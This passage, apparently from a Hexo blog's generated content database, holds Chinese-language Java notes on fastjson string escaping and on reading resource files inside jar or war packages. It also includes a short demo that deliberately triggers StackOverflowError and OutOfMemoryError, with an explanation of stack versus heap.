class=\"line\">map.put(&quot;hello&quot;,&quot;&#123;\\&quot;he\\&quot;,\\&quot;llo\\&quot;&#125;&quot;);</span><br></pre></td></tr></table></figure></p>\n<p>如果不加入转译字符就会报错，但是这样根据key取value的时候就会输出转译字符，如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;\\&quot;wor\\&quot;:\\&quot;ld\\&quot;&#125;&quot;</span><br></pre></td></tr></table></figure></p>\n<p>为了能正常的输出JSON字符串需要把字符串转正json格式。</p>\n<p>使用fastjson<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">JSON.toJSONString(&quot;&#123;\\&quot;wor\\&quot;:\\&quot;ld\\&quot;&#125;&quot;)</span><br></pre></td></tr></table></figure></p>\n<p>代码：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.aha</span><br><span class=\"line\"></span><br><span class=\"line\">import com.alibaba.fastjson.JSON;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.util.HashMap;</span><br><span class=\"line\">import java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * Created by han</span><br><span class=\"line\"> */</span><br><span class=\"line\">public class testJSON &#123;</span><br><span class=\"line\">    public static void main(String[] args)&#123;</span><br><span class=\"line\">        Map&lt;String,String&gt; map = new HashMap&lt;&gt;();</span><br><span class=\"line\">        map.put(&quot;hello&quot;,&quot;&#123;\\&quot;he\\&quot;,\\&quot;llo\\&quot;&#125;&quot;);</span><br><span class=\"line\">        map.put(&quot;world&quot;, JSON.toJSONString(&quot;&#123;\\&quot;wor\\&quot;:\\&quot;ld\\&quot;&#125;&quot;));</span><br><span class=\"line\">        for (String key : map.keySet()) &#123;</span><br><span class=\"line\">            System.out.println(&quot;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&quot;+map.get(key));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>输出如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;&#123;\\&quot;wor\\&quot;:\\&quot;ld\\&quot;&#125;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&quot;he&quot;,&quot;llo&quot;&#125;</span><br></pre></td></tr></table></figure></p>\n"},{"title":"Java获取工程jar包war包中的文件","date":"2018-07-10T13:09:19.000Z","_content":"#### 1.相对路径有问题\n工程目录如图：\n\n--\n用相对路径的方法可以获取跟src同一目录下的js文件\n```\n//scripts前不要加   “/”\n        FileReader file = \n        new FileReader(\"scripts/textchat.js\");\n        \n\n```\n但是这样打包之后会找不到文件\n#### 2.使用反射\n把文件放在resource目录下\n\n用反射获取类文件编译后所在目录\n\n然后用获取到的路径+相对路径获取文件\n\n测试类\n```\npublic class paths {\n\n    public static void main(String args[]) throws FileNotFoundException {\n    \n        //下面三种方法都可以获取相对路径\n        System.out.println(paths.class.\n        getResource(\"/\").\n        getPath());\n        \n        System.out.println(paths.class.\n        getResource(\"\").\n        getPath());\n        \n        System.out.println(paths.class.\n        getClassLoader().getResource(\"\").\n        getPath());\n        \n        //获取文件\n        FileReader file = \n        new FileReader(paths.class.\n        getResource(\"/\").\n        getPath()+\"scripts/textchat.js\");\n    }\n}\n```\n这样在打包之后就可以访问想要的文件了。","source":"_posts/Java/Java获取工程jar包war包中的文件.md","raw":"---\ntitle: Java获取工程jar包war包中的文件\ndate: 2018-07-10 21:09:19\ntags: Java\n---\n#### 1.相对路径有问题\n工程目录如图：\n\n--\n用相对路径的方法可以获取跟src同一目录下的js文件\n```\n//scripts前不要加   “/”\n        FileReader file = \n        new FileReader(\"scripts/textchat.js\");\n        \n\n```\n但是这样打包之后会找不到文件\n#### 2.使用反射\n把文件放在resource目录下\n\n用反射获取类文件编译后所在目录\n\n然后用获取到的路径+相对路径获取文件\n\n测试类\n```\npublic class paths {\n\n    public static void main(String args[]) throws FileNotFoundException {\n    \n        //下面三种方法都可以获取相对路径\n        System.out.println(paths.class.\n        getResource(\"/\").\n        getPath());\n        \n        System.out.println(paths.class.\n        getResource(\"\").\n        getPath());\n        \n        System.out.println(paths.class.\n        getClassLoader().getResource(\"\").\n        getPath());\n        \n        //获取文件\n        FileReader file = \n        new FileReader(paths.class.\n        getResource(\"/\").\n        getPath()+\"scripts/textchat.js\");\n    }\n}\n```\n这样在打包之后就可以访问想要的文件了。","slug":"Java/Java获取工程jar包war包中的文件","published":1,"updated":"2018-07-10T13:10:09.893Z","_id":"cjjedmh9m002y0gtj49y5db3e","comments":1,"layout":"post","photos":[],"link":"","content":"<h4 id=\"1-相对路径有问题\"><a href=\"#1-相对路径有问题\" class=\"headerlink\" title=\"1.相对路径有问题\"></a>1.相对路径有问题</h4><p>工程目录如图：</p>\n<p>–<br>用相对路径的方法可以获取跟src同一目录下的js文件<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//scripts前不要加   “/”</span><br><span class=\"line\">        FileReader file = </span><br><span class=\"line\">        new FileReader(&quot;scripts/textchat.js&quot;);</span><br></pre></td></tr></table></figure></p>\n<p>但是这样打包之后会找不到文件</p>\n<h4 id=\"2-使用反射\"><a href=\"#2-使用反射\" class=\"headerlink\" title=\"2.使用反射\"></a>2.使用反射</h4><p>把文件放在resource目录下</p>\n<p>用反射获取类文件编译后所在目录</p>\n<p>然后用获取到的路径+相对路径获取文件</p>\n<p>测试类<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class paths &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String args[]) throws FileNotFoundException &#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">        //下面三种方法都可以获取相对路径</span><br><span class=\"line\">        System.out.println(paths.class.</span><br><span class=\"line\">        getResource(&quot;/&quot;).</span><br><span class=\"line\">        getPath());</span><br><span class=\"line\">        </span><br><span class=\"line\">        System.out.println(paths.class.</span><br><span class=\"line\">        getResource(&quot;&quot;).</span><br><span class=\"line\">        getPath());</span><br><span class=\"line\">        </span><br><span class=\"line\">        System.out.println(paths.class.</span><br><span class=\"line\">        getClassLoader().getResource(&quot;&quot;).</span><br><span class=\"line\">        getPath());</span><br><span class=\"line\">        </span><br><span class=\"line\">        //获取文件</span><br><span class=\"line\">        FileReader file = </span><br><span class=\"line\">        new FileReader(paths.class.</span><br><span class=\"line\">        getResource(&quot;/&quot;).</span><br><span class=\"line\">        getPath()+&quot;scripts/textchat.js&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这样在打包之后就可以访问想要的文件了。</p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1-相对路径有问题\"><a href=\"#1-相对路径有问题\" class=\"headerlink\" title=\"1.相对路径有问题\"></a>1.相对路径有问题</h4><p>工程目录如图：</p>\n<p>–<br>用相对路径的方法可以获取跟src同一目录下的js文件<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//scripts前不要加   “/”</span><br><span class=\"line\">        FileReader file = </span><br><span class=\"line\">        new FileReader(&quot;scripts/textchat.js&quot;);</span><br></pre></td></tr></table></figure></p>\n<p>但是这样打包之后会找不到文件</p>\n<h4 id=\"2-使用反射\"><a href=\"#2-使用反射\" class=\"headerlink\" title=\"2.使用反射\"></a>2.使用反射</h4><p>把文件放在resource目录下</p>\n<p>用反射获取类文件编译后所在目录</p>\n<p>然后用获取到的路径+相对路径获取文件</p>\n<p>测试类<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class paths &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String args[]) throws FileNotFoundException &#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">        //下面三种方法都可以获取相对路径</span><br><span class=\"line\">        System.out.println(paths.class.</span><br><span class=\"line\">        getResource(&quot;/&quot;).</span><br><span class=\"line\">        getPath());</span><br><span class=\"line\">        </span><br><span class=\"line\">        System.out.println(paths.class.</span><br><span class=\"line\">        getResource(&quot;&quot;).</span><br><span class=\"line\">        getPath());</span><br><span class=\"line\">        </span><br><span class=\"line\">        System.out.println(paths.class.</span><br><span class=\"line\">        getClassLoader().getResource(&quot;&quot;).</span><br><span class=\"line\">        getPath());</span><br><span class=\"line\">        </span><br><span class=\"line\">        //获取文件</span><br><span class=\"line\">        FileReader file = </span><br><span class=\"line\">        new FileReader(paths.class.</span><br><span class=\"line\">        getResource(&quot;/&quot;).</span><br><span class=\"line\">        getPath()+&quot;scripts/textchat.js&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这样在打包之后就可以访问想要的文件了。</p>\n"},{"title":"Jetty最小实例","date":"2018-07-10T13:09:19.000Z","_content":"","source":"_posts/Java/Jetty最小实例.md","raw":"---\ntitle: Jetty最小实例\ndate: 2018-07-10 21:09:19\ntags: Java\n---\n","slug":"Java/Jetty最小实例","published":1,"updated":"2018-07-10T13:10:09.896Z","_id":"cjjedmh9n00300gtj572vsn0z","comments":1,"layout":"post","photos":[],"link":"","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"内存溢出","date":"2018-07-10T13:09:19.000Z","_content":"links\n\nhttps://www.cnblogs.com/zzck/archive/2016/07/26/5707168.html\n\nhttp://www.jb51.net/article/106520.htm\n\nhttps://stackoverflow.com/questions/11435613/whats-the-difference-between-stackoverflowerror-and-outofmemoryerror\n\nhttp://www.cnblogs.com/penghongwei/p/3603326.html\n\nhttps://plumbr.io/outofmemoryerror/gc-overhead-limit-exceeded\n\n\njava code\n```\nimport java.util.HashMap;\n\n/**\n * Created by hanqian18790 on 2017/12/25.\n * fuck\n */\npublic class OutOfMemeroy {\n    public static void main(String[] as){\n        System.out.println(\"fuck u mm\");\n        new OutOfMemeroy().StackOverflow(\"fuck\");\n        new OutOfMemeroy().GCOverHeadLimit();\n        new OutOfMemeroy().HeapSpace();\n    }\n\n    private void StackOverflow(Object o){\n        if(o==null){\n            o = new OutOfMemeroy();\n        }\n        StackOverflow(o);\n    }\n\n    private void GCOverHeadLimit(){\n        for(int i = 0;i<100;i++){\n            new TestThread(System.currentTimeMillis()+\"\").run();\n            new TestThread(System.currentTimeMillis()+\"\").run();\n            new TestThread(System.currentTimeMillis()+\"\").run();\n            new TestThread(System.currentTimeMillis()+\"\").run();\n            try {\n                Thread.sleep(1);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void HeapSpace(){\n        new TestThread(System.currentTimeMillis()+\"\").run();\n        new TestThread(System.currentTimeMillis()+\"\").run();\n        new TestThread(System.currentTimeMillis()+\"\").run();\n        new TestThread(System.currentTimeMillis()+\"\").run();\n    }\n\n}\n\nclass TestThread extends Thread{\n    public TestThread(String name) {\n        super(name);\n    }\n\n    public void run() {\n        HashMap map = new HashMap();\n        while (true){\n            map.put(System.currentTimeMillis(),map);\n            System.out.println(System.currentTimeMillis());\n            try {\n                Thread.sleep(1);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```\nWhen you start JVM you define how much RAM it can use use for processing. JVM divides this into certain memory locations for its processing purpose, two of those are Stack & Heap\n\nOutOfMemoryError is related to Heap. If you have large objects (or) referenced objects in memory, then you will see OutofMemoryError. If you have strong references to objects, then GC can't clean the memory space allocated for that object. When JVM tries to allocate memory for new object and not enough space available it throws OutofMemoryError because it can't allocate required amount of memory.\n\nHow to avoid: Make sure un-necessary objects are available for GC\n\nStackOverflowError is related to stack. All your local variables and methods calls related data will be on stack. For every method call one stack frame will be created and local as well as method call related data will be placed inside the stack frame. Once method execution is completed, stack frame will be removed. ONE WAY to reproduce this is, have infinite loop for method call, you will see stackoverflow error, because stack frame will be populated with method data for every call but it won't be freed (removed).\n\nHow to avoid: Make sure method calls are ending (not in infinite loop)","source":"_posts/Java/内存溢出.md","raw":"---\ntitle: 内存溢出\ndate: 2018-07-10 21:09:19\ntags: Java\n---\nlinks\n\nhttps://www.cnblogs.com/zzck/archive/2016/07/26/5707168.html\n\nhttp://www.jb51.net/article/106520.htm\n\nhttps://stackoverflow.com/questions/11435613/whats-the-difference-between-stackoverflowerror-and-outofmemoryerror\n\nhttp://www.cnblogs.com/penghongwei/p/3603326.html\n\nhttps://plumbr.io/outofmemoryerror/gc-overhead-limit-exceeded\n\n\njava code\n```\nimport java.util.HashMap;\n\n/**\n * Created by hanqian18790 on 2017/12/25.\n * fuck\n */\npublic class OutOfMemeroy {\n    public static void main(String[] as){\n        System.out.println(\"fuck u mm\");\n        new OutOfMemeroy().StackOverflow(\"fuck\");\n        new OutOfMemeroy().GCOverHeadLimit();\n        new OutOfMemeroy().HeapSpace();\n    }\n\n    private void StackOverflow(Object o){\n        if(o==null){\n            o = new OutOfMemeroy();\n        }\n        StackOverflow(o);\n    }\n\n    private void GCOverHeadLimit(){\n        for(int i = 0;i<100;i++){\n            new TestThread(System.currentTimeMillis()+\"\").run();\n            new TestThread(System.currentTimeMillis()+\"\").run();\n            new TestThread(System.currentTimeMillis()+\"\").run();\n            new TestThread(System.currentTimeMillis()+\"\").run();\n            try {\n                Thread.sleep(1);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void HeapSpace(){\n        new TestThread(System.currentTimeMillis()+\"\").run();\n        new TestThread(System.currentTimeMillis()+\"\").run();\n        new TestThread(System.currentTimeMillis()+\"\").run();\n        new TestThread(System.currentTimeMillis()+\"\").run();\n    }\n\n}\n\nclass TestThread extends Thread{\n    public TestThread(String name) {\n        super(name);\n    }\n\n    public void run() {\n        HashMap map = new HashMap();\n        while (true){\n            map.put(System.currentTimeMillis(),map);\n            System.out.println(System.currentTimeMillis());\n            try {\n                Thread.sleep(1);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```\nWhen you start JVM you define how much RAM it can use use for processing. JVM divides this into certain memory locations for its processing purpose, two of those are Stack & Heap\n\nOutOfMemoryError is related to Heap. If you have large objects (or) referenced objects in memory, then you will see OutofMemoryError. If you have strong references to objects, then GC can't clean the memory space allocated for that object. When JVM tries to allocate memory for new object and not enough space available it throws OutofMemoryError because it can't allocate required amount of memory.\n\nHow to avoid: Make sure un-necessary objects are available for GC\n\nStackOverflowError is related to stack. All your local variables and methods calls related data will be on stack. For every method call one stack frame will be created and local as well as method call related data will be placed inside the stack frame. Once method execution is completed, stack frame will be removed. ONE WAY to reproduce this is, have infinite loop for method call, you will see stackoverflow error, because stack frame will be populated with method data for every call but it won't be freed (removed).\n\nHow to avoid: Make sure method calls are ending (not in infinite loop)","slug":"Java/内存溢出","published":1,"updated":"2018-07-10T13:10:09.899Z","_id":"cjjedmh9o00320gtj5wfbfvlt","comments":1,"layout":"post","photos":[],"link":"","content":"<p>links</p>\n<p><a href=\"https://www.cnblogs.com/zzck/archive/2016/07/26/5707168.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/zzck/archive/2016/07/26/5707168.html</a></p>\n<p><a href=\"http://www.jb51.net/article/106520.htm\" target=\"_blank\" rel=\"noopener\">http://www.jb51.net/article/106520.htm</a></p>\n<p><a href=\"https://stackoverflow.com/questions/11435613/whats-the-difference-between-stackoverflowerror-and-outofmemoryerror\" target=\"_blank\" rel=\"noopener\">https://stackoverflow.com/questions/11435613/whats-the-difference-between-stackoverflowerror-and-outofmemoryerror</a></p>\n<p><a href=\"http://www.cnblogs.com/penghongwei/p/3603326.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/penghongwei/p/3603326.html</a></p>\n<p><a href=\"https://plumbr.io/outofmemoryerror/gc-overhead-limit-exceeded\" target=\"_blank\" rel=\"noopener\">https://plumbr.io/outofmemoryerror/gc-overhead-limit-exceeded</a></p>\n<p>java code<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import java.util.HashMap;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * Created by hanqian18790 on 2017/12/25.</span><br><span class=\"line\"> * fuck</span><br><span class=\"line\"> */</span><br><span class=\"line\">public class OutOfMemeroy &#123;</span><br><span class=\"line\">    public static void main(String[] as)&#123;</span><br><span class=\"line\">        System.out.println(&quot;fuck u mm&quot;);</span><br><span class=\"line\">        new OutOfMemeroy().StackOverflow(&quot;fuck&quot;);</span><br><span class=\"line\">        new OutOfMemeroy().GCOverHeadLimit();</span><br><span class=\"line\">        new OutOfMemeroy().HeapSpace();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    private void StackOverflow(Object o)&#123;</span><br><span class=\"line\">        if(o==null)&#123;</span><br><span class=\"line\">            o = new OutOfMemeroy();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        StackOverflow(o);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    private void GCOverHeadLimit()&#123;</span><br><span class=\"line\">        for(int i = 0;i&lt;100;i++)&#123;</span><br><span class=\"line\">            new TestThread(System.currentTimeMillis()+&quot;&quot;).run();</span><br><span class=\"line\">            new TestThread(System.currentTimeMillis()+&quot;&quot;).run();</span><br><span class=\"line\">            new TestThread(System.currentTimeMillis()+&quot;&quot;).run();</span><br><span class=\"line\">            new TestThread(System.currentTimeMillis()+&quot;&quot;).run();</span><br><span class=\"line\">            try &#123;</span><br><span class=\"line\">                Thread.sleep(1);</span><br><span class=\"line\">            &#125; catch (InterruptedException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    private void HeapSpace()&#123;</span><br><span class=\"line\">        new TestThread(System.currentTimeMillis()+&quot;&quot;).run();</span><br><span class=\"line\">        new TestThread(System.currentTimeMillis()+&quot;&quot;).run();</span><br><span class=\"line\">        new TestThread(System.currentTimeMillis()+&quot;&quot;).run();</span><br><span class=\"line\">        new TestThread(System.currentTimeMillis()+&quot;&quot;).run();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class TestThread extends Thread&#123;</span><br><span class=\"line\">    public TestThread(String name) &#123;</span><br><span class=\"line\">        super(name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public void run() &#123;</span><br><span class=\"line\">        HashMap map = new HashMap();</span><br><span class=\"line\">        while (true)&#123;</span><br><span class=\"line\">            map.put(System.currentTimeMillis(),map);</span><br><span class=\"line\">            System.out.println(System.currentTimeMillis());</span><br><span class=\"line\">            try &#123;</span><br><span class=\"line\">                Thread.sleep(1);</span><br><span class=\"line\">            &#125; catch (InterruptedException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>When you start JVM you define how much RAM it can use use for processing. JVM divides this into certain memory locations for its processing purpose, two of those are Stack &amp; Heap</p>\n<p>OutOfMemoryError is related to Heap. If you have large objects (or) referenced objects in memory, then you will see OutofMemoryError. If you have strong references to objects, then GC can’t clean the memory space allocated for that object. When JVM tries to allocate memory for new object and not enough space available it throws OutofMemoryError because it can’t allocate required amount of memory.</p>\n<p>How to avoid: Make sure un-necessary objects are available for GC</p>\n<p>StackOverflowError is related to stack. All your local variables and methods calls related data will be on stack. For every method call one stack frame will be created and local as well as method call related data will be placed inside the stack frame. Once method execution is completed, stack frame will be removed. ONE WAY to reproduce this is, have infinite loop for method call, you will see stackoverflow error, because stack frame will be populated with method data for every call but it won’t be freed (removed).</p>\n<p>How to avoid: Make sure method calls are ending (not in infinite loop)</p>\n","site":{"data":{}},"excerpt":"","more":"<p>links</p>\n<p><a href=\"https://www.cnblogs.com/zzck/archive/2016/07/26/5707168.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/zzck/archive/2016/07/26/5707168.html</a></p>\n<p><a href=\"http://www.jb51.net/article/106520.htm\" target=\"_blank\" rel=\"noopener\">http://www.jb51.net/article/106520.htm</a></p>\n<p><a href=\"https://stackoverflow.com/questions/11435613/whats-the-difference-between-stackoverflowerror-and-outofmemoryerror\" target=\"_blank\" rel=\"noopener\">https://stackoverflow.com/questions/11435613/whats-the-difference-between-stackoverflowerror-and-outofmemoryerror</a></p>\n<p><a href=\"http://www.cnblogs.com/penghongwei/p/3603326.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/penghongwei/p/3603326.html</a></p>\n<p><a href=\"https://plumbr.io/outofmemoryerror/gc-overhead-limit-exceeded\" target=\"_blank\" rel=\"noopener\">https://plumbr.io/outofmemoryerror/gc-overhead-limit-exceeded</a></p>\n<p>java code<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import java.util.HashMap;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * Created by hanqian18790 on 2017/12/25.</span><br><span class=\"line\"> * fuck</span><br><span class=\"line\"> */</span><br><span class=\"line\">public class OutOfMemeroy &#123;</span><br><span class=\"line\">    public static void main(String[] as)&#123;</span><br><span class=\"line\">        System.out.println(&quot;fuck u mm&quot;);</span><br><span class=\"line\">        new OutOfMemeroy().StackOverflow(&quot;fuck&quot;);</span><br><span class=\"line\">        new OutOfMemeroy().GCOverHeadLimit();</span><br><span class=\"line\">        new OutOfMemeroy().HeapSpace();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    private void StackOverflow(Object o)&#123;</span><br><span class=\"line\">        if(o==null)&#123;</span><br><span class=\"line\">            o = new OutOfMemeroy();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        StackOverflow(o);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    private void GCOverHeadLimit()&#123;</span><br><span class=\"line\">        for(int i = 0;i&lt;100;i++)&#123;</span><br><span class=\"line\">            new TestThread(System.currentTimeMillis()+&quot;&quot;).run();</span><br><span class=\"line\">            new TestThread(System.currentTimeMillis()+&quot;&quot;).run();</span><br><span class=\"line\">            new TestThread(System.currentTimeMillis()+&quot;&quot;).run();</span><br><span class=\"line\">            new TestThread(System.currentTimeMillis()+&quot;&quot;).run();</span><br><span class=\"line\">            try &#123;</span><br><span class=\"line\">                Thread.sleep(1);</span><br><span class=\"line\">            &#125; catch (InterruptedException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    private void HeapSpace()&#123;</span><br><span class=\"line\">        new TestThread(System.currentTimeMillis()+&quot;&quot;).run();</span><br><span class=\"line\">        new TestThread(System.currentTimeMillis()+&quot;&quot;).run();</span><br><span class=\"line\">        new TestThread(System.currentTimeMillis()+&quot;&quot;).run();</span><br><span class=\"line\">        new TestThread(System.currentTimeMillis()+&quot;&quot;).run();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class TestThread extends Thread&#123;</span><br><span class=\"line\">    public TestThread(String name) &#123;</span><br><span class=\"line\">        super(name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public void run() &#123;</span><br><span class=\"line\">        HashMap map = new 